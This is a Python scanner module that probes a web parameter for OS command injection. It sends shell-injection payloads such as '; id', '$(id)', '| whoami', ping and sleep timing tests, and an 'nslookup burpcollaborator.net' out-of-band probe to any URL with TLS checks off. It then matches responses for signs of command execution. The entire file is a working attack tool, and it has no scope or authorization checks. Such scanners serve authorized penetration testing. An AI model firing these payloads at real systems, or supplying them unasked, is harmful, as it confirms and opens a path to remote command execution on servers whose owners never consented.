import re, time
from typing import Optional
import requests

CMDI_PAYLOADS = [
    ("; id", "uid="),
    ("| id", "uid="),
    ("` id`", "uid="),
    ("$(id)", "uid="),
    ("; whoami", None),
    ("| whoami", None),
    ("; ping -c 3 127.0.0.1", None),
    ("| ping -n 3 127.0.0.1", None),
    ("& ping -c 3 127.0.0.1 &", None),
    ("%0a id", "uid="),
    ("%0a whoami", None),
    ("'; id;'", "uid="),
    ('"; id;"', "uid="),
    ("| nslookup burpcollaborator.net", None),
]

OUTPUT_INDICATORS = [
    r"uid=\d+\([\w]+\)",
    r"gid=\d+\([\w]+\)",
    r"groups?=\d+\([\w]+\)",
    r"Microsoft Windows",
    r"NT AUTHORITY",
    r"root:[^:]+:\d+:\d+",
    r"www-data",
    r"admin\b",
    r"bin/bash",
    r"bin/sh",
    r"cmd\.exe",
    r"command not found",
    r"is not recognized",
    r"TTY|tty",
    r"\d+ bytes from",
    r"time[<=]\d+",
    r"PING |ping statistics",
    r"Name\s*:\s*\w+",
]


def check(url: str, param: str, sess: Optional[requests.Session] = None,
          timeout: float = 10.0) -> dict:
    if sess is None:
        sess = requests.Session()
    result = {"vulnerable": False, "type": None, "evidence": [], "payload": None}

    has_time_test = False
    for payload, indicator in CMDI_PAYLOADS:
        try:
            sep = "&" if "?" in url else "?"
            r = sess.get("%s%s%s=%s" % (url, sep, param, payload),
                         timeout=timeout, verify=False)

            if indicator and indicator in r.text:
                result["vulnerable"] = True
                result["type"] = "output"
                result["evidence"].append("cmdi: %s => %s" % (payload[:15], indicator))
                result["payload"] = payload
                break

            for pat in OUTPUT_INDICATORS:
                if re.search(pat, r.text):
                    result["vulnerable"] = True
                    result["type"] = "output"
                    result["evidence"].append("cmdi: %s matched <%s>" % (payload[:15], pat))
                    result["payload"] = payload
                    break
        except:
            pass
        if result["vulnerable"]:
            break

    if not result["vulnerable"]:
        time_payloads = [
            "; ping -c 3 127.0.0.1",
            "| ping -n 3 127.0.0.1",
            "; sleep 3",
            "| sleep 3",
            "& sleep 3 &",
        ]
        for payload in time_payloads:
            try:
                sep = "&" if "?" in url else "?"
                start = time.time()
                sess.get("%s%s%s=%s" % (url, sep, param, payload),
                         timeout=timeout + 2, verify=False)
                elapsed = time.time() - start
                if elapsed >= 2.5:
                    result["vulnerable"] = True
                    result["type"] = "time"
                    result["evidence"].append("cmdi time: %s => %.1fs" % (payload[:15], elapsed))
                    result["payload"] = payload
                    break
            except:
                pass

    return result
